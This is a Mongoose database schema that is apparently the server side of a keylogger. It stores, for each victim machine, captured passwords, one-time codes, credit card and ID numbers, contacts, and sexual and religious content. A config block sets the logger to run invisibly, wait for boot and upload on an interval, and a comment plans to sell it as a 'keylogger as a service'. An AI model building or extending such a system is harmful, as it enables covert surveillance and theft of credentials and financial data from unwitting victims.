import mongoose from 'mongoose';

const ClientProfileSchema = new mongoose.Schema({
  deviceName: { type: String, required: true }, // e.g., hostname or machine identifier
  display_name: {type: String, required: false},
  registered_on: { type: Date, default: Date.now },
  tags: [String],
  // Daddy: { type: mongoose.Schema.Types.ObjectId, ref: 'User'}, // This is for future if I want to deploy it as Keylogger as service kinda shit then each person should see his client's only!
  TypingSpeed: Number, //wpm
  offensive_keywords: [String],
  Passwords: [String],
  OTP: [String],
  EmailAddresses: [String],
  PhoneNumbers: [String],
  IDNumbers: [String],
  CreditCardNumbers: [String],
  LocationReferences: [String],
  Names: [String],
  URLs: [String],
  dates: [String],
  ip_addresses: [String],
  monetary_amounts: [String],
  sexual_content: [String],
  religious_references: [String],
  total_sessions: Number,
  last_seen: Date,
  total_days_active: Number,
  total_active_time: Number, // in milliseconds
  apps_used: [{
    appname: String,
    timespent: Number // in milliseconds
  }],
  notes: String,              // Admin notes
  location: String,           // optional 
  system_info: {
    os: String,
    arch: String,
    hostname: String,
    ip: String
  },
  config: {
    format: { type: Number, default: 0 }, // 0 = labels, 10 = decimal, 16 = hex
    visible: { type: Boolean, default: false }, // true = VISIBLE, false = INVISIBLE
    boot_wait: { type: Boolean, default: true }, // true = BOOT_WAIT, false = NOWAIT
    mouse_ignore: { type: Boolean, default: true }, // true = ignore mouse clicks
    serverName: { type: String, default: "localhost" },
    resource: { type: String, default: "/" },
    intervalMinutes: { type: Number, default: 5 }, // Minutes
    log_file_name: { type: String, default: "keylogger.log" },
    backend_port: { type: Number, default: 8000 }
  }
});

const ClientProfile = mongoose.model('ClientProfile', ClientProfileSchema);

export default ClientProfile; 